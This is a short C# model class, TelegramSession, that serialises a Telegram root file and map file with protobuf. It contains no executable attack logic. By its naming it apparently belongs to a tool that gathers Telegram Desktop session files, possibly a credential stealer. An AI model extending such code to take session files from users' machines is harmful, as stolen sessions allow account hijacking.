using ProtoBuf;
using System.ComponentModel;

namespace NoiseMe.Drags.App.Models.Common
{
	[ProtoContract(Name = "TelegramSession")]
	public class TelegramSession : INotifyPropertyChanged
	{
		private DesktopFile _rootFile;

		private DesktopFile _mapFile;

		[ProtoMember(1, Name = "RootFile")]
		public DesktopFile RootFile
		{
			get
			{
				return _rootFile;
			}
			set
			{
				_rootFile = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("RootFile"));
			}
		}

		[ProtoMember(2, Name = "MapFile")]
		public DesktopFile MapFile
		{
			get
			{
				return _mapFile;
			}
			set
			{
				_mapFile = value;
				this.PropertyChanged?.Invoke(this, new PropertyChangedEventArgs("MapFile"));
			}
		}

		public event PropertyChangedEventHandler PropertyChanged;
	}
}
